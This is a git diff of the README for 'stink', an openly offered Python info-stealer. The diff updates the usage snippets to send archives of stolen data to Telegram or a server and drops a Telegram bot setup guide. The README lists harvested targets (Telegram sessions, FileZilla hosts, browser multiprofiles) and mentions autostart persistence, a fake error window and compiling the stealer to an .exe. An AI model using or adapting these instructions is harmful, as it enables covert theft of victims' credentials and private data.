@@ -1,6 +1,8 @@
 # stink
 
-Stealer in just 3 lines with sending to telegram.
+Stealer in just a few lines with sending to Telegram / Server.
+
+**Wiki:** https://github.com/FallenAstaroth/stink/wiki
 
 ## Description
 The `stink` already has an impressive functionality that will only expand.
@@ -11,9 +13,6 @@ The `stink` already has an impressive functionality that will only expand.
   * [Standard](#Standard)
   * [Certain modules](#Certain-modules)
   * [Additional parameters](#Additional-parameters)
-* [Telegram bot setup](#Telegram-bot-setup)
-  * [Getting token](#Getting-token)
-  * [Getting id](#Getting-id)
 * [Creating exe](#Creating-exe)
   * [Creating executable file](#Creating-executable-file)
   * [With BAT](#With-BAT)
@@ -41,7 +40,7 @@ The `stink` already has an impressive functionality that will only expand.
    - Telegram sessions
    - FileZilla hosts
 3. Support for browser multiprofiles.
-4. Sending an archive of collected data to Telegram.
+4. Sending an archive of collected data to Telegram / Server.
 5. Execution in a separate thread.
 6. Execution using multiprocessor.
 7. Possibility to add to autostart.
@@ -51,9 +50,11 @@ The `stink` already has an impressive functionality that will only expand.
 ### Standard
 ```python
 from stink import Stealer
+from stink.utils.senders import TelegramSender
 
 if __name__ == '__main__':
-    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
+
 ```
 ### Certain modules
 
@@ -61,9 +62,10 @@ An example with only system data collection and screenshot.
 ```python
 from stink import Stealer
 from stink.enums import Features
+from stink.utils.senders import TelegramSender
 
 if __name__ == '__main__':
-    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID, features=[Features.system, Features.screenshot]).run()
+    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
 ```
 ### Additional parameters
 
@@ -103,41 +105,6 @@ Pass if you want to include only certain modules. Modules for the list can be im
   - `message` - showing a fake error window.
 
 Pass it on if you want to include additional utilities. Utilities for the list can be imported from `stink.enums.Utils`.
-
-## Telegram bot setup
-### Getting token
-1. Open a chat with [BotFather](https://t.me/botfather).
-2. Write the command ```/newbot```.
-
-<p align="left">
-  <a href="">
-    <img src="_1.png" width="500px" style="display: inline-block;">
-  </a>
-</p>
-
-3. Write the name of the bot, then the nickname with the attribute ```_bot``` at the end.
-
-<p align="left">
-  <a href="">
-    <img src="_2.png" width="500px" style="display: inline-block;">
-  </a>
-</p>
-
-4. Insert the resulting token into the ```YOUR_TOKEN``` field in the script.
-
-### Getting id
-1. Open a chat with [Get My ID](https://t.me/getmyid_bot).
-2. Write the command ```/start```.
-
-<p align="left">
-  <a href="">
-    <img src="_3.png" width="500px" style="display: inline-block;">
-  </a>
-</p>
-
-3. Insert the resulting ID into the ```YOUR_ID``` field in the script.
-
-After that, you need to write any message to the bot, so he will be able to send us the archive.
 
 ## Creating exe
 Python is an interpreted programming language, so we first translate it into C and then compile it into an .exe file.
